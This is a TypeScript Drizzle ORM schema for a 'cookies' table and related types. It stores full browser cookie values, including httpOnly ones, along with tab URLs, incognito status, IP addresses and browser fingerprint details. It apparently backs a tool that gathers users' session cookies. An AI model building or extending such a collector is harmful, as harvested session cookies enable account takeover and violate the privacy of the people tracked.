import {
  pgTable,
  serial,
  text,
  json,
  timestamp,
  boolean,
  integer,
} from "drizzle-orm/pg-core";

// Table for storing cookie data
export const cookies = pgTable("cookies", {
  id: serial("id").primaryKey(),
  url: text("url").notNull(),
  tabId: integer("tab_id").notNull(),
  tabTitle: text("tab_title"),
  favIconUrl: text("favicon_url"),
  incognito: boolean("incognito").default(false),
  cookiesData: json("cookies_data").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  language: text("language"),
  timeZone: text("time_zone"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Types for cookie data
export type Cookie = {
  domain: string;
  expirationDate?: number;
  hostOnly: boolean;
  httpOnly: boolean;
  name: string;
  path: string;
  sameSite: string;
  secure: boolean;
  session: boolean;
  storeId: string;
  value: string;
};

export type TabInfo = {
  id: number;
  url: string;
  title: string;
  favIconUrl: string | null;
  status: string | null;
  incognito: boolean;
  windowId: number | null;
  active: boolean;
};

export type UserInfo = {
  ipAddress: string;
  browserInfo: {
    userAgent: string;
    language: string;
    cookiesEnabled: boolean;
    timeZone: string;
    timestamp: string;
  };
};

export type CookiePayload = {
  cookies: Cookie[];
  tabInfo: TabInfo;
  userInfo: UserInfo;
  timestamp: string;
};
